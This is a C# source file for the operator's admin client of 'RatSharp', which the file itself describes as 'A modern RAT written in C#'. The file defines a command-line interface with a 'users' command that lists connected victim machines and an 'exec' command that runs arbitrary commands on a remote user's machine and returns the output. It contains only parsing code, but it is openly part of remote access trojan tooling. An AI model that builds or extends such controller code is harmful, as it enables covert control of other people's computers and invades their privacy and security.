using System.Threading.Tasks;
using System.CommandLine;
using System.CommandLine.Builder;
using System.CommandLine.Parsing;

namespace AdminClient;

/// <summary>
/// Provides an ICommandLine implementation based on System.CommandLine Nuget
/// https://www.nuget.org/packages/System.CommandLine
/// </summary>
internal sealed class CommandLine : ICommandLine
{
  private readonly Parser _parser;

  internal CommandLine()
  {
    _parser = CreateParser();
  }

  public async Task RunAsync(string[] args)
  {
    await _parser.InvokeAsync(args);
  }

  #region helper methods for creating the command line parser

  private static Parser CreateParser()
  {
    RootCommand rootCmd = CreateRootCommand();
    var commandLineBuilder = new CommandLineBuilder(rootCmd);
    commandLineBuilder.UseHelp().UseSuggestDirective().UseParseErrorReporting();
    Parser parser = commandLineBuilder.Build();
    return parser;
  }

  private static RootCommand CreateRootCommand()
  {
    var urlOption = new Option<string>(
      aliases: new[] {"--url", "-u"},
      description: "Url of the RatSharp http(s) server to connect to. Example: http://localhost:8080"
    ) {IsRequired = true,};

    var timeoutOption = new Option<int>(
      aliases: new[] {"--timeout", "-t"},
      description: "Maximum number of seconds a command is allowed to run before it succeeds or errors out",
      getDefaultValue: () => 15
    );

    var verboseOption = new Option<bool>(
      aliases: new[] {"--verbose", "-v"},
      description: "Display verbose output"
    );

    var rootCmd = new RootCommand("A modern RAT written in C#");
    rootCmd.AddGlobalOption(urlOption);
    rootCmd.AddGlobalOption(timeoutOption);
    rootCmd.AddGlobalOption(verboseOption);

    Command usersCmd = CreateUsersCommand();
    rootCmd.AddCommand(usersCmd);

    Command execCmd = CreateExecCommand();
    rootCmd.AddCommand(execCmd);

    return rootCmd;
  }

  private static Command CreateUsersCommand()
  {
    var userIdOption = new Option<string?>(
      aliases: new[] {"--id", "-i"},
      description: "Id of the connected user. Displays all connected users if not specified"
    );

    var longUserInfoOption = new Option<bool>(
      aliases: new[] {"--long", "-l"},
      description: "Display extended user information"
    );

    var usersCmd = new Command("users", "Display information about connected user(s)");
    usersCmd.AddOption(userIdOption);
    usersCmd.AddOption(longUserInfoOption);

    return usersCmd;
  }

  private static Command CreateExecCommand()
  {
    var userIdOption = new Option<string>(
      aliases: new[] {"--id", "-i"},
      description: "Id of the connected user."
    ) {IsRequired = true};

    var cmdArgument = new Argument<string>("command",
      "Command to execute. Surround with double quotes if it has multiple tokens");

    var execCmd = new Command("exec", "Executes a command on the remote user's machine and displays the output");
    execCmd.AddOption(userIdOption);
    execCmd.AddArgument(cmdArgument);

    return execCmd;
  }

  #endregion
}